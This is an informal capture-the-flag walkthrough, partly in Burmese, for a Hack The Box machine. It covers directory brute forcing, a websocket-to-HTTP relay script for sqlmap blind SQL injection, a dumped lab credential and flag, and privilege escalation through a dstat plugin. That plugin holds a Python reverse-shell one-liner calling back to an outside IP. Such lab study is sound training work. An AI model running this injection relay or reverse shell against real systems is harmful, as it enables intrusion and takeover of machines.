
subl /etc/hosts  => host twar htat dal
nmap 10.0.0.1   => port 22 and 80 was open

port 80 mar web service shi dal -> I using gobuster for dir

gobuster dir -u http://scroccer.htb -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,php3,html,txt   

I found tiny directory. and i google tiny folder default username and password and i got service.

cat /etc/hosts     => bar service run nay tay lal kyi dal

$ cat /etc/hosts
127.0.0.1       localhost       soccer  soccer.htb      soc-player.soccer.htb  => this service is interesting

And i found another webservice was running 

I saw a ticket number -> i inspect it but i found nothing so i think they are using web socket

so i google like web socket injection -> i found this url
https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html

I using his tutorial for sql injection

----

`from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer  
from urllib.parse import unquote, urlparse  
from websocket import create_connection  
  
ws_server = "ws://soc-player.soccer.htb:9091"  
  
def send_ws(payload):  
 ws = create_connection(ws_server)  
 # If the server returns a response on connect, use below line   
 #resp = ws.recv() # If server returns something like a token on connect you can find and extract from here  
   
 # For our case, format the payload in JSON  
 message = unquote(payload).replace('"','\'') # replacing " with ' to avoid breaking JSON structure  
 data = '{"id":"%s"}' % message  
  
 ws.send(data)  
 resp = ws.recv()  
 ws.close()  
  
 if resp:  
  return resp  
 else:  
  return ''  
  
def middleware_server(host_port,content_type="text/plain"):  
  
 class CustomHandler(SimpleHTTPRequestHandler):  
  def do_GET(self) -> None:  
   self.send_response(200)  
   try:  
    payload = urlparse(self.path).query.split('=',1)[1]  
   except IndexError:  
    payload = False  
      
   if payload:  
    content = send_ws(payload)  
   else:  
    content = 'No parameters specified!'  
  
   self.send_header("Content-type", content_type)  
   self.end_headers()  
   self.wfile.write(content.encode())  
   return  
  
 class _TCPServer(TCPServer):  
  allow_reuse_address = True  
  
 httpd = _TCPServer(host_port, CustomHandler)  
 httpd.serve_forever()  
  
  
print("[+] Starting MiddleWare Server")  
print("[+] Send payloads in http://localhost:8081/?id=*")  
  
try:  
 middleware_server(('0.0.0.0',8081))  
except KeyboardInterrupt:  
 pass'
 
------

and then run this payload python3 abc.py  . At the another terminal -> i using this one

sqlmap -u “http://localhost:8081/?id=1" -p “id”  => i got username and password 

+------+-------------------+----------+----------------------+  
| id   | email             | username | password             |  
+------+-------------------+----------+----------------------+  
| 1324 | player@player.htb | player   | PlayerOftheMatch2022 |  
+------+-------------------+----------+----------------------+

sshplayer@10.0.1    => I got user  / user flag -> a9da41b1701edd6b278bc5d79354c0f2


And then i run linpeas

![[1 sya9_ChRxCYO2x-_Rf76xg.webp]]


for file in $(find / -type f -name *.conf 2>/dev/null);do grep -lF nopass $file;done  => file enum script => very powerful

find / -name dstat -type d 2>/dev/null   => we find dstat location

nano dstat_leee.py  -> we create python shell with payload all the things payload 

import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.10.14.96”,9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(“/bin/sh”)  => payload

nc -nvlp 9999  => i listen it

doas -u root /usr/bin/dstat --lee  => i run it

I got root ####